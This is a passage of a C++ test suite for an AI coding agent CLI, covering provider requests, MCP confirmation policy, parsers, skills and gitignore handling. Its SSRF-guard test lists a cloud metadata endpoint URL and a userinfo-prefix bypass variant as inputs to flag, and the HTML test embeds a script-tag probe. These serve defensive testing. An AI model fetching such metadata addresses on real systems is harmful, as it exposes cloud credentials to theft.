static void test_prompt_caching() {
    std::cout << "prompt caching (anthropic cache_control)" << std::endl;
    JSON tools = JSON::Array{ JSON::Object{
        { "type", "function" },
        { "function", JSON::Object{ { "name", "t" }, { "description", "d" },
                                    { "parameters", JSON::Object{ { "type", "object" } } } } } } };

    // On: tools/system/last-message get cache_control.
    {
        agent::Config cfg; cfg.prompt_cache = true;
        agent::providers::Anthropic p(cfg);
        agent::Conversation c; c.set_system("sys"); c.add_user("hi");
        JSON req = p.build_request(c, tools);
        check(req["system"] == JSON::TYPE::ARRAY, "system becomes a block array when caching");
        check(req["system"][req["system"].size() - 1].contains("cache_control"), "system block cached");
        check(req["tools"][req["tools"].size() - 1].contains("cache_control"), "last tool cached");
        JSON lastm = req["messages"][req["messages"].size() - 1];
        check(lastm["content"] == JSON::TYPE::ARRAY &&
              lastm["content"][lastm["content"].size() - 1].contains("cache_control"), "last message cached");
    }

    // Off: nothing is marked, system stays a plain string.
    {
        agent::Config cfg; cfg.prompt_cache = false;
        agent::providers::Anthropic p(cfg);
        agent::Conversation c; c.set_system("sys"); c.add_user("hi");
        JSON req = p.build_request(c, tools);
        check(req["system"] == JSON::TYPE::STRING, "system stays a string when caching off");
        check(!req["tools"][0].contains("cache_control"), "no tool cache_control when off");
    }

    // Claude keeps the CLI identity first and caches the last system block.
    {
        agent::Config cfg; cfg.prompt_cache = true;
        agent::providers::Claude cl(cfg);
        agent::Conversation c; c.set_system("my sys prompt"); c.add_user("hi");
        JSON req = cl.build_request(c, tools);
        check(req["system"] == JSON::TYPE::ARRAY && req["system"].size() >= 2, "claude system is blocks");
        check(req["system"][0]["text"].to_string().find("Claude Code") != std::string::npos, "CLI identity is first");
        check(req["system"][req["system"].size() - 1].contains("cache_control"), "claude caches the last system block");
    }
}

static void test_anthropic_role_merge() {
    // A /btw note is a standalone user message; the next prompt is another user
    // message. Anthropic requires alternating roles, so consecutive same-role
    // plain-text messages must be merged into one.
    std::cout << "anthropic consecutive-role merge (/btw)" << std::endl;
    agent::Config cfg;
    agent::providers::Anthropic p(cfg);
    agent::Conversation c;
    c.set_system("sys");
    c.add_user("remember: do not touch tests"); // /btw note
    c.add_user("now fix the bug");               // next real prompt
    JSON req = p.build_request(c, JSON::Array{});
    check(req["messages"].size() == 1, "two consecutive user messages merge into one");
    std::string merged = req["messages"][0]["content"].to_string();
    check(merged.find("do not touch tests") != std::string::npos &&
          merged.find("now fix the bug") != std::string::npos,
          "merged content keeps both the note and the prompt");

    // Normal alternation is left untouched.
    agent::Conversation c2;
    c2.set_system("sys");
    c2.add_user("a"); c2.add_assistant("b"); c2.add_user("c");
    JSON req2 = p.build_request(c2, JSON::Array{});
    check(req2["messages"].size() == 3, "alternating roles are not merged");
}

static void test_kimi_thinking_effort() {
    std::cout << "kimi thinking effort" << std::endl;
    agent::Config cfg;
    agent::providers::Kimi k(cfg);
    agent::Conversation c;
    c.add_user("hi");

    k.apply_provider_options(JSON::Object{ { "thinking", "xhigh" } });
    JSON req = k.build_request(c, JSON::Array{});
    check(req.contains("thinking"), "kimi sends a thinking field");
    check(req["thinking"]["effort"].to_string() == "high", "xhigh normalised to high (Kimi API rejects xhigh)");

    k.apply_provider_options(JSON::Object{ { "thinking", "off" } });
    req = k.build_request(c, JSON::Array{});
    check(req["thinking"]["type"].to_string() == "disabled", "off disables thinking");
}

static void test_anthropic_thinking() {
    std::cout << "anthropic thinking" << std::endl;
    agent::Config cfg;
    cfg.model = "claude-opus-4-8";
    agent::providers::Anthropic p(cfg);
    agent::Conversation c;
    c.add_user("hi");

    JSON req = p.build_request(c, JSON::Array{});
    check(!req.contains("thinking"), "no thinking by default");

    p.apply_provider_options(JSON::Object{ { "thinking", "high" } });
    req = p.build_request(c, JSON::Array{});
    check(req.contains("thinking") && req["thinking"]["type"].to_string() == "enabled", "thinking enabled");
    long budget = static_cast<long>(static_cast<long long>(req["thinking"]["budget_tokens"]));
    long maxt = static_cast<long>(static_cast<long long>(req["max_tokens"]));
    check(budget == 16000, "high effort budget");
    check(maxt > budget, "max_tokens exceeds the thinking budget");

    // The requested effort must survive a max_tokens at (or above) the model
    // ceiling: apportioning max_tokens first left only the 1024 minimum for
    // thinking, so every effort level silently collapsed to the same value.
    {
        agent::Config full; full.model = "claude-opus-4-8";
        full.max_tokens = agent::providers::Anthropic::output_cap_for("claude-opus-4-8");
        agent::providers::Anthropic fp(full);
        agent::Conversation fc; fc.add_user("hi");
        fp.apply_provider_options(JSON::Object{ { "thinking", "high" } });
        JSON fr = fp.build_request(fc, JSON::Array{});
        long fbudget = static_cast<long>(static_cast<long long>(fr["thinking"]["budget_tokens"]));
        long ftotal  = static_cast<long>(static_cast<long long>(fr["max_tokens"]));
        check(fbudget == 16000, "effort is honoured at a ceiling-sized max_tokens");
        check(ftotal <= agent::providers::Anthropic::output_cap_for("claude-opus-4-8"),
              "total stays within the model ceiling");
        check(ftotal - fbudget > 0, "an answer allowance remains");
    }

    p.apply_provider_options(JSON::Object{ { "thinking", "max" } });
    req = p.build_request(c, JSON::Array{});
    // At max effort the request uses the whole output ceiling, split between the
    // thinking budget and room for the answer. Assert the invariant (the total is
    // the ceiling, and both parts are non-trivial) rather than a fixed split,
    // which changes with the configured max_tokens.
    long mbudget = static_cast<long>(static_cast<long long>(req["thinking"]["budget_tokens"]));
    long mtotal  = static_cast<long>(static_cast<long long>(req["max_tokens"]));
    long ceiling = agent::providers::Anthropic::output_cap_for("claude-opus-4-8");
    check(mtotal == ceiling, "max effort uses the full output ceiling");
    check(mbudget > 0 && mbudget < mtotal, "thinking budget leaves room for the answer");
    check(mtotal - mbudget >= 8192, "at least the answer margin is reserved");

    JSON resp = JSON::Object{ { "content", JSON::Array{
        JSON::Object{ { "type", "thinking" }, { "thinking", "reasoning here" } },
        JSON::Object{ { "type", "text" }, { "text", "answer" } }
    }}};
    auto r = p.parse_response(resp);
    check(r.thinking == "reasoning here", "parses the thinking block");
    check(r.message == "answer", "parses the text block");

    // Claude must inherit Anthropic's thinking handling (it overrides
    // apply_provider_options for the model, and must call the base).
    agent::providers::Claude claude(cfg);
    claude.apply_provider_options(JSON::Object{ { "thinking", "high" } });
    agent::Conversation cc; cc.add_user("hi");
    JSON creq = claude.build_request(cc, JSON::Array{});
    check(creq.contains("thinking"), "claude applies thinking via apply_provider_options");
}

static void test_provider_capabilities() {
    std::cout << "provider capabilities" << std::endl;
    agent::Config cfg;

    agent::providers::OpenAI openai(cfg);
    check(!openai.supports("model-command"), "openai does not claim model-command");

    agent::providers::Kimi kimi(cfg);
    check(kimi.supports("model-command"), "kimi supports model-command");
    check(!kimi.supports("image-input"), "kimi does not claim image-input");

    agent::providers::Claude claude(cfg);
    check(claude.supports("advisor"), "claude supports advisor");
    check(!openai.supports("advisor"), "openai does not claim advisor");
}

static void test_advisor_tool() {
    std::cout << "advisor tool + registry add/remove" << std::endl;
    std::string seen;
    agent::tools::AdvisorTool tool([&seen](const std::string& q) {
        seen = q;
        return std::string("advice: try X");
    });
    check(tool.name() == "consult_advisor", "advisor tool name");
    check(tool.parameters()["required"][0].to_string() == "question", "question is required");

    std::string r = tool.execute(JSON::Object{ { "question", "how do I foo?" } });
    check(seen == "how do I foo?", "handler receives the question");
    check(r == "advice: try X", "execute returns the handler's advice");
    check(tool.execute(JSON::Object{}) .rfind("error:", 0) == 0, "missing question is an error");

    // Registry add/remove drives the schema (what the model is offered).
    agent::tools::Registry reg;
    reg.register_defaults();
    check(!reg.has("consult_advisor"), "advisor not registered by default");
    reg.add(std::make_unique<agent::tools::AdvisorTool>([](const std::string&) { return std::string("x"); }));
    check(reg.has("consult_advisor"), "advisor registered after add");
    reg.remove("consult_advisor");
    check(!reg.has("consult_advisor"), "advisor gone after remove");
}

static void test_mcp_annotations_policy() {
    std::cout << "mcp annotations -> confirmation policy" << std::endl;
    auto noop = [](const std::string&, const std::string&, const JSON&) { return std::string("done"); };
    JSON schema = JSON::Object{ { "type", "object" }, { "properties", JSON::Object{} } };

    // Default (no annotations): confirms like a writing tool.
    agent::tools::McpTool plain("mcp__s__t", "d", schema, "s", "t", noop);
    check(plain.requires_confirmation(), "un-annotated MCP tool requires confirmation");
    check(plain.danger_reason(JSON::Object{}).empty(), "un-annotated tool is not danger-listed");

    // readOnlyHint: runs freely.
    agent::tools::McpTool ro("mcp__s__r", "d", schema, "s", "r", noop, true, false);
    check(!ro.requires_confirmation(), "readOnlyHint tool runs without confirmation");

    // destructiveHint: always warns, even in automatic mode.
    agent::tools::McpTool boom("mcp__s__drop", "d", schema, "s", "drop", noop, false, true);
    check(!boom.danger_reason(JSON::Object{}).empty(), "destructiveHint sets a danger reason");
    {
        agent::tools::Registry reg;
        reg.add(std::make_unique<agent::tools::McpTool>(
            "mcp__s__drop", "d", schema, "s", "drop",
            [](const std::string&, const std::string&, const JSON&) { return std::string("ran"); },
            false, true));
        reg.set_mode(agent::tools::ConfirmMode::automatic);
        int asked = 0;
        reg.set_confirm_callback([&](const agent::tools::ConfirmRequest& rq, std::string&) {
            ++asked;
            check(!rq.danger.empty(), "confirm request carries the danger reason");
            return agent::tools::Decision::deny;
        });
        std::string res = reg.execute("mcp__s__drop", JSON::Object{});
        check(asked == 1, "destructive MCP tool asks even in automatic mode");
        check(res.find("declined") != std::string::npos, "deny blocks the call");
    }
}

static void test_mcp_tool_and_config() {
    std::cout << "mcp proxy tool + config parse" << std::endl;

    // Proxy routing: execute() forwards (server, tool, args) to the handler.
    std::string gotS, gotT; JSON gotA;
    agent::tools::McpTool tool(
        "mcp__srv__do", "does a thing",
        JSON::Object{ { "type", "object" }, { "properties", JSON::Object{} } },
        "srv", "do",
        [&](const std::string& s, const std::string& t, const JSON& a) {
            gotS = s; gotT = t; gotA = a; return std::string("ok:result");
        });
    check(tool.name() == "mcp__srv__do", "proxy uses the namespaced name");
    check(tool.parameters()["type"].to_string() == "object", "proxy exposes the server schema");
    std::string r = tool.execute(JSON::Object{ { "x", static_cast<long long>(1) } });
    check(gotS == "srv" && gotT == "do", "proxy routes server + raw tool name");
    check(r == "ok:result", "proxy returns the handler result");

    // Config parse (no spawn): servers are listed with their command, not connected.
    std::string path = "/tmp/ai_agent_mcp_test.json";
    {
        std::ofstream ofd(path);
        ofd << "{\"mcpServers\":{"
               "\"alpha\":{\"command\":\"/bin/true\",\"args\":[\"--x\"]},"
               "\"beta\":{\"command\":\"/bin/false\"},"
               "\"gamma\":{\"url\":\"https://example.com/mcp\"}}}";
    }
    agent::mcp::Client c;
    int n = c.load_config(path);
    check(n == 3, "load_config counts three servers (stdio + http)");
    auto st = c.status();
    check(st.size() == 3, "status lists three servers");
    bool found_alpha = false, found_gamma = false;
    for ( const auto& si : st ) {
        if ( si.name == "alpha" ) {
            found_alpha = true;
            check(si.command == "/bin/true", "stdio command parsed");
            check(si.transport == "stdio", "stdio transport");
            check(!si.connected, "not connected before connect_all");
        }
        if ( si.name == "gamma" ) {
            found_gamma = true;
            check(si.transport == "http", "url server uses http transport");
            check(si.command == "https://example.com/mcp", "http url parsed");
        }
    }
    check(found_alpha && found_gamma, "stdio + http servers present");
    check(c.load_config("/tmp/does_not_exist_mcp.json") == 0, "missing config -> 0 servers");

    std::filesystem::remove(path);
}

static void test_html_to_text() {
    std::cout << "fetch_url html_to_text" << std::endl;
    std::string html =
        "<html><head><style>body{color:red}</style>"
        "<script>alert('x')</script></head>"
        "<body><h1>Title &amp; Stuff</h1>"
        "<p>First para.</p>"
        "<p>Second &lt;b&gt;bold&lt;/b&gt; &#39;quote&#39;.</p>"
        "<div>DIVA</div><div>DIVB</div></body></html>";
    std::string t = agent::tools::html_to_text(html);

    check(t.find("alert") == std::string::npos, "script contents removed");
    check(t.find("color:red") == std::string::npos, "style contents removed");
    check(t.find("Title & Stuff") != std::string::npos, "entities decoded (&amp;)");
    check(t.find("First para.") != std::string::npos, "text preserved");
    check(t.find("Second <b>bold</b> 'quote'.") != std::string::npos, "numeric + named entities decoded");
    check(t.find("<h1>") == std::string::npos && t.find("<p>") == std::string::npos, "tags stripped");
    size_t ia = t.find("DIVA"), ib = t.find("DIVB");
    check(ia != std::string::npos && ib != std::string::npos && ia < ib &&
          t.substr(ia, ib - ia).find('\n') != std::string::npos, "block tags become line breaks");
}

static void test_stream_sanitizer() {
    std::cout << "stream sanitizer" << std::endl;
    agent::StreamTextSanitizer s;

    std::string out;
    std::string c1; c1 += 'a'; c1 += '\r';
    std::string c2; c2 += 'b'; c2 += '\x1b';
    std::string c3; c3 += 'c'; c3 += '\x7f'; c3 += 'd'; c3 += '\n';
    std::string c4; c4 += '\t'; c4 += '\x01'; c4 += 'f';
    std::string c5; c5 += '\x02'; c5 += 'g';
    out += s.push(c1);
    out += s.push(c2);
    out += s.push(c3);
    out += s.push(c4);
    out += s.push(c5);
    check(out.find('\r') == std::string::npos, "carriage return stripped");
    check(out.find('\x1b') == std::string::npos, "escape stripped");
    check(out.find('\x7f') == std::string::npos, "DEL stripped");
    check(out.find("abcd\n\t") != std::string::npos, "printable text kept");
    check(out.find('\x01') != std::string::npos && out.find('\x02') != std::string::npos,
          "thinking markers kept");

    agent::StreamTextSanitizer utf8;
    std::string split;
    split += utf8.push("Kyll");
    split += utf8.push(std::string("\xC3", 1));
    split += utf8.push(std::string("\xA4!", 2));
    check(split == "Kyllä!", "split UTF-8 survives across chunks");

    // Normalization must run AFTER the sanitizer, never before it. normalize_text
    // matches whole multi-byte sequences, so normalizing a raw chunk whose tail is
    // half a code point silently misses it — and the held-back bytes are not
    // re-normalized when the remainder arrives, leaking the raw character to the
    // display. Mirrors the streaming path in repl.cpp.
    auto stream_normalized = [](std::initializer_list<std::string> chunks) {
        agent::StreamTextSanitizer s;
        std::string out;
        for ( const auto& c : chunks )
            out += agent::normalize_text(s.push(c));
        out += agent::normalize_text(s.finish());
        return out;
    };
    // U+2019 (right single quotation mark) normalizes to an ASCII apostrophe.
    check(stream_normalized({ std::string("it\xE2\x80\x99s") }) == "it's",
          "a whole multi-byte sequence normalizes");
    check(stream_normalized({ std::string("it\xE2", 3), std::string("\x80\x99s", 3) }) == "it's",
          "a sequence split after the lead byte still normalizes");
    check(stream_normalized({ std::string("it\xE2\x80", 4), std::string("\x99s", 2) }) == "it's",
          "a sequence split before the last byte still normalizes");
}

static void test_web_search_parse() {
    std::cout << "web_search DDG html parser" << std::endl;
    std::string html =
        "<div class=\"result results_links web-result\">"
        "<h2 class=\"result__title\">"
        "<a rel=\"nofollow\" class=\"result__a\" "
        "href=\"//duckduckgo.com/l/?uddg=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FCurl&amp;rut=abc\">"
        "cURL &amp; libcurl - Wikipedia</a></h2>"
        "<a class=\"result__snippet\" href=\"//x\">cURL is a <b>command-line</b> tool for transferring data.</a>"
        "</div>"
        "<div class=\"result\">"
        "<a rel=\"nofollow\" class=\"result__a\" "
        "href=\"//duckduckgo.com/l/?uddg=https%3A%2F%2Fcurl.se%2F&amp;rut=x\">curl.se home</a>"
        "<a class=\"result__snippet\">The official <b>curl</b> site &amp; downloads.</a>"
        "</div>";

    auto r = agent::tools::parse_ddg_html(html, 5);
    check(r.size() == 2, "parses two results");
    check(r[0].url == "https://en.wikipedia.org/wiki/Curl", "decodes uddg redirect to real url");
    check(r[0].title == "cURL & libcurl - Wikipedia", "title tags stripped + entities decoded");
    check(r[0].snippet.find("command-line tool for transferring") != std::string::npos, "snippet tags stripped");
    check(r[1].url == "https://curl.se/", "second result url decoded");
    check(r[1].snippet == "The official curl site & downloads.", "second snippet decoded");

    auto r1 = agent::tools::parse_ddg_html(html, 1);
    check(r1.size() == 1, "max_results is respected");

    check(agent::tools::parse_ddg_html("<html>no results here</html>", 5).empty(), "no results -> empty");
}

static void test_find_symbol() {
    std::cout << "find_symbol (definition-aware search)" << std::endl;
    std::string dir = "/tmp/ai_agent_findsym_test";
    std::filesystem::remove_all(dir);
    std::filesystem::create_directories(dir + "/objs"); // ignored dir
    {
        std::ofstream ofd(dir + "/widget.cpp");
        ofd << "class WidgetFactory {\n"
               "public:\n"
               "    int compute_total(int a, int b) {\n"   // definition (no ;)
               "        return a + b;\n"
               "    }\n"
               "};\n"
               "void caller() { compute_total(1, 2); }\n"; // call (has ;) -> not a def
    }
    {
        std::ofstream ofd(dir + "/config.py");
        ofd << "def parse_config(path):\n    return {}\n";
    }
    {
        std::ofstream ofd(dir + "/objs/generated.cpp");
        ofd << "int compute_total(int, int); // stray in an ignored dir\n";
    }

    agent::tools::FindSymbol fs;

    std::string r1 = fs.execute(JSON::Object{ { "name", "WidgetFactory" }, { "path", dir } });
    check(r1.find("widget.cpp") != std::string::npos && r1.find("class WidgetFactory") != std::string::npos,
          "finds a class definition");

    std::string r2 = fs.execute(JSON::Object{ { "name", "compute_total" }, { "path", dir } });
    check(r2.find("int compute_total(int a, int b)") != std::string::npos, "finds the function definition");
    check(r2.find("caller()") == std::string::npos, "excludes the call site (line ends with ';')");
    check(r2.find("objs/generated") == std::string::npos, "skips ignored directories (objs)");

    std::string r3 = fs.execute(JSON::Object{ { "name", "parse_config" }, { "path", dir } });
    check(r3.find("def parse_config") != std::string::npos, "finds a python def");

    std::string r4 = fs.execute(JSON::Object{ { "name", "does_not_exist_xyz" }, { "path", dir } });
    check(r4.find("no definition") != std::string::npos, "reports nothing found");

    std::string r5 = fs.execute(JSON::Object{ { "name", "bad name!" }, { "path", dir } });
    check(r5.rfind("error:", 0) == 0, "rejects a non-identifier name");

    std::filesystem::remove_all(dir);
}

static void test_skills() {
    std::cout << "skills (load + frontmatter + override + tool)" << std::endl;
    std::string home = "/tmp/ai_skills_home";
    std::string proj = "/tmp/ai_skills_proj";
    std::filesystem::remove_all(home); std::filesystem::remove_all(proj);
    std::filesystem::create_directories(home + "/skills");
    std::filesystem::create_directories(proj + "/.agent/skills");
    std::filesystem::create_directories(proj + "/.agents/skills/build");

    { std::ofstream o(home + "/skills/review.md");
      o << "---\nname: code-review\ndescription: careful review\n---\nDo a careful review.\n"; }
    { std::ofstream o(home + "/skills/plain.md");
      o << "Just some plain instructions.\n"; }
    { std::ofstream o(proj + "/.agent/skills/review.md");
      o << "---\nname: code-review\ndescription: project review\n---\nProject-specific review.\n"; }
    { std::ofstream o(proj + "/.agents/skills/build/SKILL.md");
      o << "---\ndescription: build guidance\n---\nBuild the project and run tests.\n"; }

    auto skills = agent::load_skills(home, proj);
    check(skills.size() == 3, "skills loaded from flat and SKILL.md layouts");
    const agent::Skill* cr = nullptr; const agent::Skill* pl = nullptr;
    const agent::Skill* build = nullptr;
    for ( const auto& s : skills ) { if ( s.name == "code-review" ) cr = &s; if ( s.name == "plain" ) pl = &s; if ( s.name == "build" ) build = &s; }
    check(cr && cr->description == "project review", "project skill overrides user by name");
    check(cr && cr->source == "project", "override marked as project source");
    check(cr && cr->content.find("Project-specific review") != std::string::npos, "frontmatter stripped, body kept");
    check(pl && pl->name == "plain" && pl->description.empty(), "no-frontmatter skill named from filename");
    check(pl && pl->content.find("plain instructions") != std::string::npos, "plain body loaded");
    check(build && build->description == "build guidance" && build->content.find("run tests") != std::string::npos,
          "nested SKILL.md loaded with directory name");

    std::string got;
    agent::tools::SkillTool tool([]() { return std::string("desc"); },
                                 [&](const std::string& n) { got = n; return std::string("loaded " + n); });
    check(tool.name() == "use_skill", "tool name");
    check(tool.execute(JSON::Object{ { "name", "code-review" } }) == "loaded code-review", "tool loads by name");
    check(got == "code-review", "loader received the name");
    check(tool.execute(JSON::Object{}).rfind("error:", 0) == 0, "missing name errors");

    std::filesystem::remove_all(home); std::filesystem::remove_all(proj);
}

static void test_tasks_tool() {
    std::cout << "update_tasks tool" << std::endl;
    JSON got;
    agent::tools::TasksTool tool([&got](const JSON& t) { got = t; return std::string("ok: 2 tasks"); });
    check(tool.name() == "update_tasks", "tool name");
    std::string r = tool.execute(JSON::Object{ { "tasks", JSON::Array{
        JSON::Object{ { "title", "explore" }, { "status", "done" } },
        JSON::Object{ { "title", "implement" }, { "status", "in_progress" } } } } });
    check(r == "ok: 2 tasks", "returns the handler result");
    check(got == JSON::TYPE::ARRAY && got.size() == 2, "forwards the full task array");
    check(got[0]["title"].to_string() == "explore", "task fields preserved");
    check(tool.execute(JSON::Object{}).rfind("error:", 0) == 0, "missing tasks is an error");
}

static void test_file_mentions() {
    std::cout << "@path file mentions" << std::endl;
    std::string f = "/tmp/ai_mention.txt";
    { std::ofstream o(f); o << "alpha\nbeta\ngamma\n"; }

    std::vector<agent::FileMention> m;
    std::string r = agent::expand_file_mentions("look at @" + f + " and fix it", &m);
    check(r.find("--- file: " + f + " (3 lines) ---") != std::string::npos, "mention expands with header");
    check(r.find("alpha\nbeta\ngamma") != std::string::npos, "content included");
    check(r.find("--- end of " + f + " ---") != std::string::npos, "end marker");
    check(m.size() == 1 && m[0].lines == 3 && !m[0].truncated, "mention info returned");

    check(agent::expand_file_mentions("mail me a@b.c today", nullptr) == "mail me a@b.c today",
          "email untouched (@ mid-token)");
    check(agent::expand_file_mentions("use @property here", nullptr) == "use @property here",
          "decorator untouched (path does not exist)");
    check(agent::expand_file_mentions("@/no/such/file.txt", nullptr) == "@/no/such/file.txt",
          "missing path untouched");

    std::string r2 = agent::expand_file_mentions("(see @" + f + ")", nullptr);
    check(r2.find("--- file: " + f) != std::string::npos && r2.rfind(")") == r2.size() - 1,
          "trailing punctuation stripped and re-attached");

    // Truncation: a file above the per-file cap.
    std::string big = "/tmp/ai_mention_big.txt";
    { std::ofstream o(big); for ( int i = 0; i < 5000; ++i ) o << "line " << i << " padding padding padding\n"; }
    std::vector<agent::FileMention> m2;
    std::string r3 = agent::expand_file_mentions("@" + big, &m2);
    check(m2.size() == 1 && m2[0].truncated, "oversize mention marked truncated");
    check(r3.find("truncated — use read_file") != std::string::npos, "truncation note present");
    check(r3.size() < 80 * 1024, "expansion respects the cap");

    std::filesystem::remove(f);
    std::filesystem::remove(big);
}

static void test_ultra_keyword() {
    std::cout << "ultracode/ultrathink detection" << std::endl;
    check(agent::has_ultra_keyword("please ultrathink about this"), "ultrathink detected");
    check(agent::has_ultra_keyword("do ULTRACODE now"), "case-insensitive");
    check(agent::has_ultra_keyword("ultracode"), "bare keyword");
    check(agent::has_ultra_keyword("end with ultrathink"), "at end of string");
    check(!agent::has_ultra_keyword("just normal text"), "absent");
    check(!agent::has_ultra_keyword("ultracoder is a person"), "not a substring match (ultracoder)");
    check(!agent::has_ultra_keyword("superultrathinking"), "whole word only");
}

static void test_block_diff() {
    std::cout << "block_diff" << std::endl;
    std::string d = agent::block_diff("one\ntwo\nthree\n", "one\nTWO\nthree\n", "a", "b");
    check(d.find("--- a") != std::string::npos && d.find("+++ b") != std::string::npos, "diff has labelled headers");
    check(d.find("- two") != std::string::npos && d.find("+ TWO") != std::string::npos, "diff shows the changed line");
    check(d.find("- one") == std::string::npos && d.find("- three") == std::string::npos, "unchanged edges are not shown as removed");
}

static void test_outline_file() {
    std::cout << "outline_file" << std::endl;
    std::string p = "/tmp/ai_outline.cpp";
    {
        std::ofstream o(p);
        o << "#include <x>\n"
          << "int add(int a, int b) {\n"
          << "    return a + b;\n"
          << "}\n"
          << "class Widget {\n"
          << "  void draw();\n"
          << "};\n"
          << "static void helper(int n)\n"
          << "{\n"
          << "    if (n > 0) {}\n"
          << "}\n";
    }
    agent::tools::OutlineFile ol;
    std::string r = ol.execute(JSON::Object{ { "path", p } });
    check(r.find("2: int add(int a, int b) {") != std::string::npos, "function signature outlined");
    check(r.find("5: class Widget {") != std::string::npos, "class outlined");
    check(r.find("8: static void helper(int n)") != std::string::npos, "multi-line signature outlined");
    check(r.find("return a + b") == std::string::npos, "body lines excluded");
    check(r.find("void draw();") == std::string::npos, "prototype (;) excluded");
    check(ol.execute(JSON::Object{ { "path", "/no/such/file" } }).rfind("error:", 0) == 0, "missing file errors");
    std::filesystem::remove(p);
}

static void test_write_preview_cap() {
    std::cout << "write_file confirm preview is line-capped" << std::endl;
    using namespace agent::tools;
    std::string f = "/tmp/ai_bigwrite.txt";
    { std::ofstream o(f); for ( int i = 0; i < 200; ++i ) o << "old line " << i << "\n"; }
    std::string newc;
    for ( int i = 0; i < 200; ++i ) newc += "new line " + std::to_string(i) + "\n";

    Registry reg;
    reg.register_defaults();
    std::string captured;
    reg.set_confirm_callback([&](const ConfirmRequest& req, std::string&) {
        captured = req.preview;
        return Decision::deny; // don't actually overwrite
    });
    reg.execute("write_file", JSON::Object{ { "path", f }, { "content", newc } });

    size_t lines = static_cast<size_t>(std::count(captured.begin(), captured.end(), '\n'));
    check(lines <= 65, "preview capped to ~60 lines, not the whole 400-line diff");
    check(captured.find("more lines; full diff not shown") != std::string::npos,
          "preview notes the hidden lines");
    std::filesystem::remove(f);
}

static void test_credential_perms() {
    std::cout << "credential file perms (ensure_owner_only)" << std::endl;
    std::string p = "/tmp/ai_tok_perm.json";
    { std::ofstream o(p); o << "{}"; }
    ::chmod(p.c_str(), 0644); // group/other-readable
    agent::auth::ensure_owner_only(p, "test");
    struct stat st{};
    ::stat(p.c_str(), &st);
    check((st.st_mode & 0777) == 0600, "loose creds tightened to 0600 on read");
    ::chmod(p.c_str(), 0600);
    agent::auth::ensure_owner_only(p, "test");
    ::stat(p.c_str(), &st);
    check((st.st_mode & 0777) == 0600, "already-0600 file unchanged");
    std::filesystem::remove(p);
}

static void test_fetch_url_ssrf() {
    std::cout << "fetch_url SSRF guard (danger_reason)" << std::endl;
    agent::tools::FetchUrl f;
    check(!f.danger_reason(JSON::Object{ { "url", "http://169.254.169.254/latest/meta-data/" } }).empty(),
          "metadata IP flagged");
    check(!f.danger_reason(JSON::Object{ { "url", "http://169.254.1.1/" } }).empty(),
          "link-local range flagged");
    check(f.danger_reason(JSON::Object{ { "url", "https://example.com/docs" } }).empty(),
          "public host not flagged");
    check(f.danger_reason(JSON::Object{ { "url", "http://localhost:3000/api" } }).empty(),
          "localhost (dev server) not flagged");
    check(f.danger_reason(JSON::Object{ { "url", "http://127.0.0.1:8080/" } }).empty(),
          "loopback not flagged");
    check(!f.danger_reason(JSON::Object{ { "url", "http://user@169.254.169.254/" } }).empty(),
          "userinfo prefix still flags the real host");
}

static void test_commands_catalog() {
    std::cout << "command catalog / help" << std::endl;
    const auto& cat = agent::command_catalog();
    check(cat.size() >= 30, "catalog has all commands");
    for ( const auto& c : cat ) {
        check(!c.name.empty() && !c.group.empty() && !c.summary.empty() && !c.detail.empty(),
              std::string("catalog entry complete: ") + c.name);
    }
    std::string ov = agent::commands_overview();
    check(ov.find("Tools & safety") != std::string::npos, "overview has group headers");
    check(ov.find("/plan") != std::string::npos, "overview lists /plan");
    check(agent::command_help("model").find("/model") != std::string::npos, "help by bare name");
    check(agent::command_help("/model").find("current model") != std::string::npos, "help by /name");
    check(agent::command_help("/info").find("/about") != std::string::npos, "help resolves an alias");
    check(agent::command_help("nope").empty(), "unknown command -> empty");
    check(agent::commands_markdown().find("# Commands") != std::string::npos, "markdown has a title");
}

static void test_gitignore() {
    std::cout << "gitignore matcher" << std::endl;
    std::string dir = "/tmp/ai_gi_test";
    std::filesystem::remove_all(dir);
    std::filesystem::create_directories(dir);
    { std::ofstream o(dir + "/.gitignore");
      o << "# a comment\n"
        << "\n"
        << "*.log\n"           // basename glob at any depth
        << "build/\n"          // directory-only
        << "/dist\n"           // root-anchored
        << "node_modules\n"    // name at any depth
        << "src/generated\n"   // anchored path
        << "**/tmp\n"          // basename at any depth
        << "!keep.log\n"; }    // negation
    agent::GitIgnore gi;
    gi.load(dir);

    check(gi.ignored("app.log", false), "*.log matches a root log");
    check(gi.ignored("sub/deep/x.log", false), "*.log matches at depth");
    check(!gi.ignored("app.txt", false), "non-matching file kept");
    check(gi.ignored("build", true), "build/ matches a directory");
    check(!gi.ignored("build", false), "build/ does not match a file named build");
    check(gi.ignored("dist", true), "/dist matches root dist");
    check(!gi.ignored("sub/dist", true), "/dist does not match a nested dist");
    check(gi.ignored("node_modules", true), "node_modules matches at root");
    check(gi.ignored("a/b/node_modules", true), "node_modules matches at depth");
    check(gi.ignored("src/generated", true), "anchored path matches");
    check(!gi.ignored("other/src/generated", true), "anchored path does not match elsewhere");
    check(gi.ignored("x/y/tmp", true), "**/tmp matches at depth");
    check(gi.ignored("tmp", true), "**/tmp matches at root");
    check(!gi.ignored("keep.log", false), "negation re-includes keep.log");
    check(gi.ignored(".git", true), ".git always ignored");

    // No .gitignore -> empty matcher, nothing ignored.
    std::filesystem::remove(dir + "/.gitignore");
    agent::GitIgnore gi2;
    gi2.load(dir);
    check(gi2.ignored("app.log", false) == false, "no .gitignore -> nothing ignored (except .git)");
    check(gi2.ignored(".git", true), ".git still ignored with no gitignore");

    std::filesystem::remove_all(dir);
}

static void test_gitignore_integration() {
    std::cout << "gitignore-aware search tools" << std::endl;
    std::string root = "/tmp/ai_gi_int";
    std::filesystem::remove_all(root);
    std::filesystem::create_directories(root + "/src");
    std::filesystem::create_directories(root + "/skipdir");
    { std::ofstream o(root + "/.gitignore"); o << "skipdir/\n*.gen.cpp\n"; }
    { std::ofstream o(root + "/src/keep.cpp"); o << "void keepfunc() {}\nint uses() { keepfunc(); return 0; }\n"; }
    { std::ofstream o(root + "/skipdir/skip.cpp"); o << "void skipfunc() {}\n"; }
    { std::ofstream o(root + "/src/thing.gen.cpp"); o << "void genfunc() {}\n"; }

    { agent::tools::FindSymbol fs;
      std::string keep = fs.execute(JSON::Object{ { "name", "keepfunc" }, { "path", root } });
      check(keep.find("keep.cpp") != std::string::npos, "find_symbol finds a tracked symbol");
      std::string skip = fs.execute(JSON::Object{ { "name", "skipfunc" }, { "path", root } });
      check(skip.find("no definition") != std::string::npos, "find_symbol skips a gitignored dir");
